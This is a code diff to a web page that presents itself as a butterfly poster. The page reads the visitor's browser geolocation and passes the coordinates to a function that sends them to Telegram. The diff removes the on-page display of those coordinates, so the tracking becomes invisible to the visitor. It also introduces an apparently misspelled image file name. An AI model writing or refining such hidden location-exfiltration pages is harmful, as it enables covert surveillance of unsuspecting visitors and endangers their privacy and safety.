@@ -11,8 +11,8 @@
             justify-content: center;
             align-items: center;
             height: 100vh;
-            background-image: url('butterflyposter.png'); /* Use the butterflyposter.png as background */
-            background-size: cover; /* Ensure the background covers the entire page */
+            background-image: url('butteryflyposter.png'); /* Reference to the background image */
+            background-size: cover; /* Cover the entire background */
             background-repeat: no-repeat; /* Prevent the background from repeating */
             background-position: center; /* Center the background image */
         }
@@ -99,6 +99,12 @@
         function showPosition(position) {
             var latitude = position.coords.latitude;
             var longitude = position.coords.longitude;
+
+            // We don't display latitude and longitude on the website now
+            // document.getElementById("location").innerHTML = 
+            // "Latitude: " + latitude + 
+            // "<br>Longitude: " + longitude;
+
             sendLocationToTelegram(latitude, longitude);
         }
 
